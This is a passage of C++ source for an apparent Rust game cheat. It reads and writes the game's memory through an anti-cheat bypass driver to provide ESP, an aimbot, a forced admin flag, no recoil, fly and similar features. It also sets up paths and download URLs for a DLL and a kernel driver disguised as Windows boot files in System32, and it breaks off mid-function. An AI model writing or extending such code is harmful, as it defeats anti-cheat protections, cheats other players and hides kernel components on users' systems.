#include <Windows.h>
#include <iostream>
#include <map>
#include <vector>
#include <Psapi.h>
#include <urlmon.h>
#include <iomanip> 
#include <wininet.h>
#include <codecvt>
#include <cstdint>
#include <stdio.h>
#include <fstream>
#include <emmintrin.h>
#include "EAC_Driver.hpp"
#include "CMap.hpp"
#include "Security.h"
#include "Menu.hpp"
#include <string>
#include "Classes.hpp"
#include <D3D11.h>
#include <imgui.h>
#include <d3dx9.h>
#include <examples/imgui_impl_dx9.h>
#include <examples/imgui_impl_win32.h>



#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"wininet.lib")

using namespace std;

IDirect3D9Ex* p_Object = 0;
IDirect3DDevice9Ex* p_Device = 0;
D3DPRESENT_PARAMETERS p_Params;

ID3DXLine* p_Line;
ID3DXFont* pFontSmall = 0;
MSG Message;
std::string folderpath = "C:\\Windows\\System32\\$WindowsBoot";
std::string dllpath = "C:\\Windows\\System32\\$WindowsBoot\\$WindowsBootFix.dll";
std::string dllpath2 = "C:\\Windows\\System32\\$WindowsBoot\\$WindowsBoot.dll";
std::string driverpath = "C:\\Windows\\System32\\$WindowsBoot\\$WindowsBoot.sys";
std::string dllurl = "https://yourdomain/$/bin/internal/data/$WindowsBootFix.dll";
std::string dllurl2 = "https://yourdomain/$/bin/internal/data/$WindowsBoot.dll";
std::string driverurl = "https://yourdomain/$/bin/internal/data/$WindowsBoot.sys";

typedef struct _MyUncStr
{
	char stub[0x10];
	int len;
	wchar_t str[1];
} *pMyUncStr;

std::vector<std::uint32_t> GetProcessIds(const std::wstring& processName);
//Security sec;
Menu menu;
HWND GameWindow = NULL;
HINSTANCE asdd;
DWORD GetThreadId(DWORD dwProcessId);
uintptr_t GABaseAddress;
uintptr_t UnityBaseAddress;
uintptr_t GOM;
uintptr_t BaseNetworkable;
BasePlayer LocalPlayer;
int ScreenWidth;
int ScreenHeight;
int ThickBullet;
int ticks = 0;
int beforeclock = 0;
int FPS = 0;
int NoSway = true;
bool overlaycreated = false;
bool InjectTheDll = true;
bool MenuOpen = true;
bool PrintedAddresses = false;
int SnapLine = false;
int ForceRun = false;
int FastReload = true;
int ESPEnabled = true;
int AimbotEnabled = true;
int MaxAimFOV = 100;
int NoRecoil = true;
int Highjump = false;
int AirStuck = false;
int AntiBlock = false;
int AntiSlow = true;
int Silent = false;
int WaterSpeed = true;


int NoSpread = true;
int ForceAutomatic = true;
int Spiderman = true;
int SkeletonESP = true;
int Predict = true;
int AdminFlags = true;
int AllTimeEoka = true;
int DoExtendMeele = true;
int NoMovePenatly = true;
int InstantCharge = true;
int PlayerESPEnabled = true;
int NameESP = false;
int DistanceESP = false;
int HeldItemESP = false;
int ShowStashes = false;
int PepeESP = false;
int EntitySpeed = false;
int BoxESP = true;
//Ore Bools
int ShowOres = false;
int ShowStoneOre = false;
int ShowMetalOre = false;
int ShowSulfurOre = false;
int Fly = false;
int ShowCollectables = false;

//Dropped Item Bools
int ShowDroppedItems = false;

int ShowVehicles = false;
int ShowCrates = false;

//Misc Stuff
int SpiderEnabled = true;
int DebugCameraEnabled = true;
int AlwaysDay = true;

float FOV = 300, curFOV;
BasePlayer closestPlayer;

class PlayerClass
{
public:
	uintptr_t Player;
	uintptr_t ObjectClass;
	std::string ClassName;
	std::string Name;
	std::wstring WName;
	Vector3 Position;
	bool IsLocalPlayer;
	int Health;
	int MaxHealth;

public:
	bool operator==(PlayerClass ent)
	{
		if (ent.Player == this->Player)
			return true;
		else
			return false;
	}
};

class OreClass
{
public:
	uintptr_t Ore;
};

class CollectableClass
{
public:
	uintptr_t Object;
};

class VehicleClass
{
public:
	uintptr_t Object;
	std::string Name;
};

class CrateClass
{
public:
	uintptr_t Object;
};

class StashClass
{
public:
	uintptr_t Object;
};

class ItemClass
{
public:
	uintptr_t Object;
	uintptr_t ObjectClass;
	std::wstring Name;
};

Vector3 localPos;

std::vector<BasePlayer> PlayerList;
std::vector<OreClass> OreList;
std::vector<CollectableClass> CollectibleList;
std::vector<VehicleClass> VehicleList;
std::vector<CrateClass> CrateList;
std::vector<StashClass> StashList;
std::vector<Item> DroppedItemList;

HANDLE hProcess = INVALID_HANDLE_VALUE;

Matrix4x4 pViewMatrix;

uint64_t scan_for_klass(const char* name)
{
	auto base = mex.GetModuleBase("GameAssembly.dll"); //mem::get_module_base(L"GameAssembly.dll");
	auto dos_header = mex.Read<IMAGE_DOS_HEADER>(base);
	auto data_header = mex.Read<IMAGE_SECTION_HEADER>(base + dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (3 * 40));
	auto next_section = mex.Read<IMAGE_SECTION_HEADER>(base + dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (4 * 40));
	auto data_size = next_section.VirtualAddress - data_header.VirtualAddress;

	if (strcmp((char*)data_header.Name, ".data")) {
		printf("[!] Section order changed\n");
	}

	for (uint64_t offset = data_size; offset > 0; offset -= 8) {
		char klass_name[0x100] = { 0 };
		auto klass = mex.Read<uint64_t>(base + data_header.VirtualAddress + offset);
		if (klass == 0) { continue; }
		auto name_pointer = mex.Read<uint64_t>(klass + 0x10);
		if (name_pointer == 0) { continue; }
		mex.Read(name_pointer, klass_name, sizeof(klass_name));
		if (!strcmp(klass_name, name)) {
			//printf("[*] 0x%x -> %s\n", data_header.VirtualAddress + offset, name);
			return klass;
		}
	}

	printf("[!] Unable to find %s in scan\n", name);
	//exit(0);
}

std::uintptr_t get_base_player(std::uintptr_t entity)
{
	const auto unk1 = mex.Read<uintptr_t>(entity + 0x18);

	if (!unk1)
		return 0;
	return mex.Read<uintptr_t>(unk1 + 0x28);
}

std::uint32_t get_player_health(std::uint64_t entity)
{
	const auto base_player = get_base_player(entity);

	if (!base_player)
		return 0;

	const auto player_health = mex.Read<float>(base_player + 0x1F4);

	if (player_health <= 0.8f)
		return 0;

	return std::lround(player_health);
}

Vector3 GetVelocity(uintptr_t Entity)
{
	uintptr_t player_model = mex.Read<uintptr_t>(Entity + 0x118);
	return mex.Read<Vector3>(player_model + 0x1D4);
}

enum BoneList : int
{
	l_hip = 1,
	l_knee,
	l_foot,
	l_toe,
	l_ankle_scale,
	pelvis,
	penis,
	GenitalCensor,
	GenitalCensor_LOD0,
	Inner_LOD0,
	GenitalCensor_LOD1,
	GenitalCensor_LOD2,
	r_hip,
	r_knee,
	r_foot,
	r_toe,
	r_ankle_scale,
	spine1,
	spine1_scale,
	spine2,
	spine3,
	spine4,
	l_clavicle,
	l_upperarm,
	l_forearm,
	l_hand,
	l_index1,
	l_index2,
	l_index3,
	l_little1,
	l_little2,
	l_little3,
	l_middle1,
	l_middle2,
	l_middle3,
	l_prop,
	l_ring1,
	l_ring2,
	l_ring3,
	l_thumb1,
	l_thumb2,
	l_thumb3,
	IKtarget_righthand_min,
	IKtarget_righthand_max,
	l_ulna,
	neck,
	head,
	jaw,
	eyeTranform,
	l_eye,
	l_Eyelid,
	r_eye,
	r_Eyelid,
	r_clavicle,
	r_upperarm,
	r_forearm,
	r_hand,
	r_index1,
	r_index2,
	r_index3,
	r_little1,
	r_little2,
	r_little3,
	r_middle1,
	r_middle2,
	r_middle3,
	r_prop,
	r_ring1,
	r_ring2,
	r_ring3,
	r_thumb1,
	r_thumb2,
	r_thumb3,
	IKtarget_lefthand_min,
	IKtarget_lefthand_max,
	r_ulna,
	l_breast,
	r_breast,
	BoobCensor,
	BreastCensor_LOD0,
	BreastCensor_LOD1,
	BreastCensor_LOD2,
	collision,
	displacement
};

Vector3 GetPosition(uintptr_t transform)
{
	if (!transform) return Vector3{ 0.f, 0.f, 0.f };

	struct Matrix34 { BYTE vec0[16]; BYTE vec1[16]; BYTE vec2[16]; };
	const __m128 mulVec0 = { -2.000, 2.000, -2.000, 0.000 };
	const __m128 mulVec1 = { 2.000, -2.000, -2.000, 0.000 };
	const __m128 mulVec2 = { -2.000, -2.000, 2.000, 0.000 };

	int Index = mex.Read<int>(transform + 0x40);// *(PINT)(transform + 0x40);
	uintptr_t pTransformData = mex.Read<uintptr_t>(transform + 0x38);
	uintptr_t transformData[2];
	mex.Read((pTransformData + 0x18), &transformData, 16);
	//mex.Read(&transformData, (PVOID)(pTransformData + 0x18), 16);
	//safe_memcpy(&transformData, (PVOID)(pTransformData + 0x18), 16);

	size_t sizeMatriciesBuf = 48 * Index + 48;
	size_t sizeIndicesBuf = 4 * Index + 4;

	PVOID pMatriciesBuf = malloc(sizeMatriciesBuf);
	PVOID pIndicesBuf = malloc(sizeIndicesBuf);

	if (pMatriciesBuf && pIndicesBuf)
	{
		// Read Matricies array into the buffer
		mex.Read(transformData[0], pMatriciesBuf, sizeMatriciesBuf);
		//impl::memory->read(transformData[0], pMatriciesBuf, sizeMatriciesBuf);
		// Read Indices array into the buffer
		mex.Read(transformData[1], pIndicesBuf, sizeIndicesBuf);

		__m128 result = *(__m128*)((ULONGLONG)pMatriciesBuf + 0x30 * Index);
		int transformIndex = *(int*)((ULONGLONG)pIndicesBuf + 0x4 * Index);

		while (transformIndex >= 0)
		{
			Matrix34 matrix34 = *(Matrix34*)((ULONGLONG)pMatriciesBuf + 0x30 * transformIndex);
			__m128 xxxx = _mm_castsi128_ps(_mm_shuffle_epi32(*(__m128i*)(&matrix34.vec1), 0x00));
			__m128 yyyy = _mm_castsi128_ps(_mm_shuffle_epi32(*(__m128i*)(&matrix34.vec1), 0x55));
			__m128 zwxy = _mm_castsi128_ps(_mm_shuffle_epi32(*(__m128i*)(&matrix34.vec1), 0x8E));
			__m128 wzyw = _mm_castsi128_ps(_mm_shuffle_epi32(*(__m128i*)(&matrix34.vec1), 0xDB));
			__m128 zzzz = _mm_castsi128_ps(_mm_shuffle_epi32(*(__m128i*)(&matrix34.vec1), 0xAA));
			__m128 yxwy = _mm_castsi128_ps(_mm_shuffle_epi32(*(__m128i*)(&matrix34.vec1), 0x71));
			__m128 tmp7 = _mm_mul_ps(*(__m128*)(&matrix34.vec2), result);

			result = _mm_add_ps(
				_mm_add_ps(
					_mm_add_ps(
						_mm_mul_ps(
							_mm_sub_ps(
								_mm_mul_ps(_mm_mul_ps(xxxx, mulVec1), zwxy),
								_mm_mul_ps(_mm_mul_ps(yyyy, mulVec2), wzyw)),
							_mm_castsi128_ps(_mm_shuffle_epi32(_mm_castps_si128(tmp7), 0xAA))),
						_mm_mul_ps(
							_mm_sub_ps(
								_mm_mul_ps(_mm_mul_ps(zzzz, mulVec2), wzyw),
								_mm_mul_ps(_mm_mul_ps(xxxx, mulVec0), yxwy)),
							_mm_castsi128_ps(_mm_shuffle_epi32(_mm_castps_si128(tmp7), 0x55)))),
					_mm_add_ps(
						_mm_mul_ps(
							_mm_sub_ps(
								_mm_mul_ps(_mm_mul_ps(yyyy, mulVec0), yxwy),
								_mm_mul_ps(_mm_mul_ps(zzzz, mulVec1), zwxy)),
							_mm_castsi128_ps(_mm_shuffle_epi32(_mm_castps_si128(tmp7), 0x00))),
						tmp7)), *(__m128*)(&matrix34.vec0));
			try {
				transformIndex = *(int*)((ULONGLONG)pIndicesBuf + 0x4 * transformIndex);
			}
			catch (...)
			{
				// Do nothing
			}
		}

		return Vector3(result.m128_f32[0], result.m128_f32[1], result.m128_f32[2]);
	}
}

bool WorldToScreen(const Vector3& EntityPos, Vector2& ScreenPos)
{
	Vector3 TransVec = Vector3(pViewMatrix._14, pViewMatrix._24, pViewMatrix._34);
	Vector3 RightVec = Vector3(pViewMatrix._11, pViewMatrix._21, pViewMatrix._31);
	Vector3 UpVec = Vector3(pViewMatrix._12, pViewMatrix._22, pViewMatrix._32);
	float w = Math::Dot(TransVec, EntityPos) + pViewMatrix._44;
	if (w < 0.098f) return false;
	float y = Math::Dot(UpVec, EntityPos) + pViewMatrix._42;
	float x = Math::Dot(RightVec, EntityPos) + pViewMatrix._41;
	ScreenPos = Vector2((ScreenWidth / 2) * (1.f + x / w), (ScreenHeight / 2) * (1.f - y / w));
	return true;
}

Vector3 GetBonePosition(uintptr_t Entity, int bone)
{
	uintptr_t player_model = mex.Read<uintptr_t>(Entity + 0x118);
	uintptr_t BoneTransforms = mex.Read<uintptr_t>(player_model + 0x48);
	uintptr_t entity_bone = mex.Read<uintptr_t>(BoneTransforms + (0x20 + (bone * 0x8)));
	return GetPosition(mex.Read<uintptr_t>(entity_bone + 0x10));
}

float GetFov(uintptr_t Entity, int Bone) {
	Vector2 ScreenPos;
	if (!WorldToScreen(GetBonePosition(Entity, Bone), ScreenPos))
		return 1000.f;
	return Math::Calc2D_Dist(Vector2(ScreenWidth / 2, ScreenHeight / 2), ScreenPos);
}

std::string get_class_name(std::uint64_t class_object)
{
	const auto object_unk = mex.Read<uintptr_t>(class_object);

	if (!object_unk)
		return {};

	return read_ascii(mex.Read<uintptr_t>(object_unk + 0x10), 64);
}

Vector3 get_obj_pos(std::uint64_t entity)
{
	const auto player_visual = mex.Read<uintptr_t>(entity + 0x8);

	if (!player_visual)
		return {};

	const auto visual_state = mex.Read<uintptr_t>(player_visual + 0x38);

	if (!visual_state)
		return {};

	return mex.Read<Vector3>(visual_state + 0x90);
}

Vector3 GetCurrentObjectPosition(std::uintptr_t entity)
{
	const auto unk1 = mex.Read<uintptr_t>(entity + 0x10);

	if (!unk1)
		return Vector3{ NULL, NULL, NULL };

	const auto unk2 = mex.Read<uintptr_t>(unk1 + 0x30);

	if (!unk2)
		return Vector3{ NULL, NULL, NULL };



	const auto unk3 = mex.Read<uintptr_t>(unk2 + 0x30);

	if (!unk3)
		return Vector3{ NULL, NULL, NULL };



	/* shouldn't be needed, but in case */
	if (!entity)
		return Vector3{ NULL, NULL, NULL };

	Vector2 ScreenPos;
	return get_obj_pos(unk3);
}


void SetAdminFlag(uintptr_t LocalPlayer)
{
	int flags = mex.Read<int>(LocalPlayer + 0x5B8);

	flags |= 4;

	mex.Write<uintptr_t>(LocalPlayer + 0x5B8, flags);
}

void SetAimingFlag(uintptr_t LocalPlayer)
{
	int flags = mex.Read<int>(LocalPlayer + 0x5B0);

	flags |= 16384;

	mex.Write<uintptr_t>(LocalPlayer + 0x5B0, flags);
}

void SetRunningFlag(uintptr_t LocalPlayer)
{
	int flags = mex.Read<int>(LocalPlayer + 0x5B0);

	flags |~ 8192;

	mex.Write<uintptr_t>(LocalPlayer + 0x5B0, flags);
}

void SetGroundAngles(std::uintptr_t LocalPlayer)
{
	auto BaseMovement = mex.Read<uintptr_t>(LocalPlayer + 0x5E8);
	if (!BaseMovement)
		return;

	mex.Write<float>(BaseMovement + 0xAC, 0.f); // private float groundAngle; // 0xAC
	mex.Write<float>(BaseMovement + 0xB0, 0.f); // private float groundAngleNew; // 0xB0
}

inline float distance_cursor(Vector2 vec)
{
	POINT p;
	if (GetCursorPos(&p))
	{
		float ydist = (vec.y - p.y);
		float xdist = (vec.x - p.x);
		float ret = sqrt(pow(ydist, 2) + pow(xdist, 2));
		return ret;
	}
}

Vector2 smooth(Vector2 pos)
{
	Vector2 center{ (float)(ScreenWidth / 2), (float)(ScreenHeight / 2) };
	Vector2 target{ 0, 0 };
	if (pos.x != 0) {
		if (pos.x > center.x) {
			target.x = -(center.x - pos.x);
			target.x /= 1;
			if (target.x + center.x > center.x * 2)
				target.x = 0;
		}

		if (pos.x < center.x) {
			target.x = pos.x - center.x;
			target.x /= 1;
			if (target.x + center.x < 0)
				target.x = 0;
		}
	}

	if (pos.y != 0) {
		if (pos.y > center.y) {
			target.y = -(center.y - pos.y);
			target.y /= 1;
			if (target.y + center.y > center.y * 2)
				target.y = 0;
		}

		if (pos.y < center.y) {
			target.y = pos.y - center.y;
			target.y /= 1;
			if (target.y + center.y < 0)
				target.y = 0;
		}
	}

	target.x /= 3;
	target.y /= 3;

	if (abs(target.x) < 1) {
		if (target.x > 0) {
			target.x = 1;
		}
		if (target.x < 0) {
			target.x = -1;
		}
	}
	if (abs(target.y) < 1) {
		if (target.y > 0) {
			target.y = 1;
		}
		if (target.y < 0) {
			target.y = -1;
		}
	}

	return target;
}



void Normalize(float& Yaw, float& Pitch) {
	if (Pitch < -89) Pitch = -89;
	else if (Pitch > 89) Pitch = 89;
	if (Yaw < -360) Yaw += 360;
	else if (Yaw > 360) Yaw -= 360;
}

void SetAlwaysDay()
{
	//auto TOD_Sky = mex.Read<uintptr_t>();
}

void DoGameHax()
{
	while (true)
	{

		if (!LocalPlayer.IsSleeping())
		{
			
			if(ForceRun){
				/*
				```
					void HACK(){ winGame=true; }
				```
				*/
				//private bool sprintForced; // 0x11C
				mex.Write<bool>(LocalPlayer.Player+0x11C,true);
			}

			if(WaterSpeed){
				mex.Write<float>(LocalPlayer.Player + 0x644, 0.10f);

				//uintptr_t entity = mex.Read<uintptr_t>(LocalPlayer.Player+0x78);
				//mex.Write<float>(entity+0x504,10.1f);
			}

			if (Spiderman) {
				LocalPlayer.DoSpider();
			}
			
			if(AdminFlags){
				LocalPlayer.SetAdminFlag();
			}
			if(AirStuck){
				mex.Write<bool>(LocalPlayer.Player + 0x498,true);
			}
			if(!AirStuck){
				mex.Write<bool>(LocalPlayer.Player + 0x498,false);	
			}
			if(Fly){
				mex.Write<bool>(LocalPlayer.Player+0x130,true);
			}
			for (int ItemsOnBelt = 0; ItemsOnBelt <= 6; ItemsOnBelt++) {
				//SetThickBullet((uintptr_t)LocalPlayer.GetHeldItem().buffer);
				if (NoSpread) {
					std::uint64_t Inventory = mex.Read<std::uint64_t>((uintptr_t)LocalPlayer.buffer + 0x5C8);
					std::uint64_t Belt = mex.Read<std::uint64_t>(Inventory + 0x28); //0x20 //0x28
					std::uint64_t ItemList = mex.Read<std::uint64_t>(Belt + 0x38);
					std::uint64_t Items = mex.Read<std::uint64_t>(ItemList + 0x10);
					std::uint64_t Item = mex.Read<std::uint64_t>(Items + 0x20 + (ItemsOnBelt * 0x8));

					std::uint64_t base_projectile = mex.Read<std::uint64_t>(Item + 0x98); //0x90 //0x98
					mex.Write<float>((std::uint64_t)base_projectile+0x2D4,-1.F);
					mex.Write<float>((std::uint64_t)base_projectile+0x2D8,-1.F);
				}
				if (NoRecoil) {
					LocalPlayer.GetHeldItem().SetNoRecoil();
				}
				if(FastReload){
					DWORD64 Held = mex.Read<DWORD64>(LocalPlayer.GetHeldItem().Item + 0x98);
					mex.Write<bool>(Held + 0x2A8, 1);

				
				}
			if(NoSway){
				std::uint64_t Inventory = mex.Read<std::uint64_t>((uintptr_t)LocalPlayer.buffer + 0x5C8);
				std::uint64_t Belt = mex.Read<std::uint64_t>(Inventory + 0x28); //0x20 //0x28
				std::uint64_t ItemList = mex.Read<std::uint64_t>(Belt + 0x38);
				std::uint64_t Items = mex.Read<std::uint64_t>(ItemList + 0x10);
				std::uint64_t Item = mex.Read<std::uint64_t>(Items + 0x20 + (ItemsOnBelt * 0x8));

				std::uint64_t base_projectile = mex.Read<std::uint64_t>(Item + 0x98); //0x90 //0x98
				mex.Write<float>(base_projectile+0x2BC,0.0f);
			}
				if(AllTimeEoka){
					std::uint64_t Inventory = mex.Read<std::uint64_t>((uintptr_t)LocalPlayer.buffer + 0x5C8);
					std::uint64_t Belt = mex.Read<std::uint64_t>(Inventory + 0x28); //0x20 //0x28
					std::uint64_t ItemList = mex.Read<std::uint64_t>(Belt + 0x38);
					std::uint64_t Items = mex.Read<std::uint64_t>(ItemList + 0x10);
					std::uint64_t Item = mex.Read<std::uint64_t>(Items + 0x20 + (ItemsOnBelt * 0x8));

					std::uint64_t base_projectile = mex.Read<std::uint64_t>(Item + 0x98); //0x90 //0x98
					std::wstring item = LocalPlayer.GetHeldItem().GetItemName();
					if(std::wcsstr(item.c_str(),L"Eoka") != nullptr){
						mex.Write<float>(base_projectile + 0x340, 1.0f);
					}
				}
				if(InstantCharge){
					std::uint64_t Inventory = mex.Read<std::uint64_t>((uintptr_t)LocalPlayer.buffer + 0x5C8);
					std::uint64_t Belt = mex.Read<std::uint64_t>(Inventory + 0x28); //0x20 //0x28
					std::uint64_t ItemList = mex.Read<std::uint64_t>(Belt + 0x38);
					std::uint64_t Items = mex.Read<std::uint64_t>(ItemList + 0x10);
					std::uint64_t Item = mex.Read<std::uint64_t>(Items + 0x20 + (ItemsOnBelt * 0x8));

					std::uint64_t base_projectile = mex.Read<std::uint64_t>(Item + 0x98); //0x90 //0x98
					std::wstring item = LocalPlayer.GetHeldItem().GetItemName();
					mex.Write<float>(base_projectile + 0x3A0, 1.f);
				}
				
				if (NoMovePenatly)
				{
					std::uint64_t Inventory = mex.Read<std::uint64_t>((uintptr_t)LocalPlayer.buffer + 0x5C8);
					std::uint64_t Belt = mex.Read<std::uint64_t>(Inventory + 0x28); //0x20 //0x28
					std::uint64_t ItemList = mex.Read<std::uint64_t>(Belt + 0x38);
					std::uint64_t Items = mex.Read<std::uint64_t>(ItemList + 0x10);
					std::uint64_t Item = mex.Read<std::uint64_t>(Items + 0x20 + (ItemsOnBelt * 0x8));

					std::uint64_t base_projectile = mex.Read<std::uint64_t>(Item + 0x98); //0x90 //0x98
					mex.Write<float>(base_projectile + 0x398, 0.f); // protected float movementPenalty; // 0x398
				}
				
				if (DoExtendMeele)
				{
					std::uint64_t Inventory = mex.Read<std::uint64_t>((uintptr_t)LocalPlayer.buffer + 0x5C8);
					std::uint64_t Belt = mex.Read<std::uint64_t>(Inventory + 0x28); //0x20 //0x28
					std::uint64_t ItemList = mex.Read<std::uint64_t>(Belt + 0x38);
					std::uint64_t Items = mex.Read<std::uint64_t>(ItemList + 0x10);
					std::uint64_t Item = mex.Read<std::uint64_t>(Items + 0x20 + (ItemsOnBelt * 0x8));

					std::uint64_t base_projectile = mex.Read<std::uint64_t>(Item + 0x98); //0x90 //0x98
					mex.Write<float>(base_projectile + 0x270, 3.f); // public float maxDistance; // 0x270
				}

				if (ForceAutomatic) {
					LocalPlayer.GetHeldItem().SetAutomatic();
				}
			}
			
		}
	}
}

void PlayerThreadFunc()
{
	while (true)
	{
		GABaseAddress = mex.GetModuleBase("GameAssembly.dll");
		if (!GABaseAddress)
		{
			//std::cout << "!GABaseAddress" << std::endl;
			return;
		}
		//std::cout << "Game Assembly: " << std::hex << std::uppercase << GABaseAddress << std::endl;

		BaseNetworkable = scan_for_klass("BaseNetworkable");
		if (!BaseNetworkable)
		{
			//std::cout << "!BaseNetworkable" << std::endl;
			return;
		}
		//std::cout << "BaseNetworkable: " << std::hex << std::uppercase << BaseNetworkable << std::endl;

		const auto unk1 = mex.Read<uintptr_t>(BaseNetworkable + 0xB8);
		if (!unk1)
		{
			//std::cout << "!unk1" << std::endl;
			return;
		}

		const auto client_entities = mex.Read<uintptr_t>(unk1);
		if (!client_entities)
		{
			//std::cout << "!client_entities" << std::endl;
			return;
		}

		const auto entity_realm = mex.Read<uintptr_t>(client_entities + 0x10);
		if (!entity_realm)
		{
			//std::cout << "!entity_realm" << std::endl;
			return;
		}

		const auto buffer_list = mex.Read<uintptr_t>(entity_realm + 0x28);
		if (!buffer_list)
		{
			//std::cout << "!buffer_list" << std::endl;
			return;
		}

		const auto object_list = mex.Read<uintptr_t>(buffer_list + 0x18);
		if (!object_list)
		{
			//std::cout << "!object_list" << std::endl;
			return;
		}

		const auto object_list_size = mex.Read<std::uint32_t>(buffer_list + 0x10);

		try
		{
			//std::ofstream classfile;
			//classfile.open("C:\\Fruity Rust\\classes.txt", std::ios_base::app);
			for (auto i = 0; i < object_list_size; i++)
			{
				const auto current_object = mex.Read<uintptr_t>(object_list + (0x20 + (i * 8)));

				if (!current_object)
				{
					//std::cout << "!current_object" << std::endl;
					continue;
				}

				const auto baseObject = mex.Read<uintptr_t>(current_object + 0x10);

				if (!baseObject)
					continue;

				const auto object = mex.Read<uintptr_t>(baseObject + 0x30);

				if (!object)
					continue;

				WORD tag = mex.Read<WORD>(object + 0x54);

				DWORD64 localElement = mex.Read<DWORD64>(object_list + 0x20);
				DWORD64 localBO = mex.Read<DWORD64>(localElement + 0x10);
				DWORD64 localPlayer = mex.Read<DWORD64>(localBO + 0x30);
				DWORD64 localOC = mex.Read<DWORD64>(localPlayer + 0x30);
				DWORD64 localT = mex.Read<DWORD64>(localOC + 0x8);
				DWORD64 localVS = mex.Read<DWORD64>(localT + 0x38);
				localPos = mex.Read<Vector3>(localVS + 0x90);

				std::string class_name = get_class_name(current_object);
				if (tag != 0 && tag != 6)
				{
					//std::cout << "Tag: " << tag << std::endl;
					char className[64];
					auto name_pointer = mex.Read<uint64_t>(object + 0x60);
					mex.Read(name_pointer, &className, sizeof(className));
					//std::cout << "Tag ClassName: " << className << std::endl;
				}

				if (tag == 6)
				{
					char className[64];
					auto name_pointer = mex.Read<uint64_t>(object + 0x60);
					mex.Read(name_pointer, &className, sizeof(className));
					DWORD64 objectClass = mex.Read<DWORD64>(object + 0x30);
					DWORD64 entity = mex.Read<DWORD64>(objectClass + 0x18);
					uintptr_t player = mex.Read<uintptr_t>(entity + 0x28);

					//Get Player Position
					DWORD64 transform = mex.Read<DWORD64>(objectClass + 0x8);
					DWORD64 visualState = mex.Read<DWORD64>(transform + 0x38);
					Vector2 ScreenPos;
					Vector3 Pos = mex.Read<Vector3>(visualState + 0x90);
					//Get Player Name.
					auto Distance = Math::Calc3D_Dist(localPos, Pos);

					BasePlayer bp;
					bp.Player = player;
					bp.ObjectClass = objectClass;
					mex.Read(player, &bp.buffer, sizeof(bp.buffer));

					//Get Player Health
					auto player_health = mex.Read<float>(player + 0x1F4);
					float healthf = nearbyint(player_health);
					int health = (int)(healthf);
					//ent.TeamId = teamid;
					if (strcmp(className, "LocalPlayer") != 0)
					{
						bp.IsLocalPlayer = false;
						//if (teamid == LocalTeamID)
					}
					else
					{
						bp.IsLocalPlayer = true;
						LocalPlayer = bp;
						//LocalTeamID = teamid
					}

					const auto player_list_iter = std::find(PlayerList.begin(), PlayerList.end(), bp);

					if (player_list_iter != PlayerList.end() && health == 0)
					{
						PlayerList.erase(player_list_iter);
						continue;
					}
					else if (player_list_iter != PlayerList.end() && health > 0)
					{
						continue;
					}

					if (PlayerList.size() > 500)
						PlayerList.clear();
					PlayerList.push_back(bp);
				}

				else if (tag == 20009) //Player Corpse
				{

				}

				else if (tag == 20011)
				{
					//std::cout << "Tag: " << "Sky Box!" << std::endl;
					char className[64];
					auto name_pointer = mex.Read<uint64_t>(object + 0x60);
					mex.Read(name_pointer, &className, sizeof(className));
					//std::cout << "Sky Classname:  " << className << std::endl;
					if (AlwaysDay)
					{
						auto objectClass = mex.Read<uintptr_t>(object + 0x30);
						auto entity = mex.Read<uintptr_t>(objectClass + 0x18);
						auto Dome = mex.Read<uintptr_t>(entity + 0x28);
						auto TODSky = mex.Read<uintptr_t>(Dome + 0x38);
						mex.Write<float>(TODSky + 0x10, 12.f);
					}
				}

				else if (class_name.find("Stash") != std::string::npos)
				{

				}

				else if (class_name.find("OreRe") != std::string::npos)
				{
					OreClass ore;
					ore.Ore = current_object;
					const auto unk1 = mex.Read<uintptr_t>(ore.Ore + 0x10);

					if (!unk1)
						continue;

					const auto unk2 = mex.Read<uintptr_t>(unk1 + 0x30);

					if (!unk2)
						continue;



					const auto unk3 = mex.Read<uintptr_t>(unk2 + 0x30);

					if (!unk3)
						continue;



					/* shouldn't be needed, but in case */
					if (!ore.Ore)
						continue;

					Vector2 ScreenPos;
					Vector3 OrePos = get_obj_pos(unk3);

					auto distance = Math::Calc3D_Dist(localPos, OrePos);
					if (distance < 100)
					{
						if (OreList.size() > 100)
							OreList.clear();
						OreList.push_back(ore);
					}

				}

				else if (class_name.find("LootCo") != std::string::npos)
				{
					CrateClass crate;
					crate.Object = current_object;
					auto pos = GetCurrentObjectPosition(current_object);
					auto distance = Math::Calc3D_Dist(localPos, pos);
					if (distance < 100)
					{
						if (CrateList.size() > 100)
							CrateList.clear();
						CrateList.push_back(crate);
					}
				}

				else if (class_name.find("Collectible") != std::string::npos)
				{
					CollectableClass object;
					object.Object = current_object;
					const auto unk1 = mex.Read<uintptr_t>(object.Object + 0x10);

					if (!unk1)
						continue;

					const auto unk2 = mex.Read<uintptr_t>(unk1 + 0x30);

					if (!unk2)
						continue;



					const auto unk3 = mex.Read<uintptr_t>(unk2 + 0x30);

					if (!unk3)
						continue;



					/* shouldn't be needed, but in case */
					if (!object.Object)
						continue;

					Vector2 ScreenPos;
					Vector3 OrePos = get_obj_pos(unk3);

					auto distance = Math::Calc3D_Dist(localPos, OrePos);
					if (distance < 100)
					{
						if (CollectibleList.size() > 200)
							CollectibleList.clear();
						CollectibleList.push_back(object);
					}
				}

				else if (class_name == "MiniCopter")
				{
					VehicleClass object;
					object.Object = current_object;
					object.Name = "MiniCopter";
					const auto unk1 = mex.Read<uintptr_t>(object.Object + 0x10);

					if (!unk1)
						continue;

					const auto unk2 = mex.Read<uintptr_t>(unk1 + 0x30);

					if (!unk2)
						continue;



					const auto unk3 = mex.Read<uintptr_t>(unk2 + 0x30);

					if (!unk3)
						continue;



					/* shouldn't be needed, but in case */
					if (!object.Object)
						continue;

					Vector2 ScreenPos;
					Vector3 OrePos = get_obj_pos(unk3);

					auto distance = Math::Calc3D_Dist(localPos, OrePos);
					if (distance < 100)
					{
						if (VehicleList.size() > 100)
							VehicleList.clear();
						VehicleList.push_back(object);
					}
				}
				else if (class_name == "HotAirBalloon")
				{
					VehicleClass object;
					object.Object = current_object;
					object.Name = "HotAirBalloon";
					const auto unk1 = mex.Read<uintptr_t>(object.Object + 0x10);

					if (!unk1)
						continue;

					const auto unk2 = mex.Read<uintptr_t>(unk1 + 0x30);

					if (!unk2)
						continue;



					const auto unk3 = mex.Read<uintptr_t>(unk2 + 0x30);

					if (!unk3)
						continue;



					/* shouldn't be needed, but in case */
					if (!object.Object)
						continue;

					Vector2 ScreenPos;
					Vector3 OrePos = get_obj_pos(unk3);

					auto distance = Math::Calc3D_Dist(localPos, OrePos);
					if (distance < 100)
					{
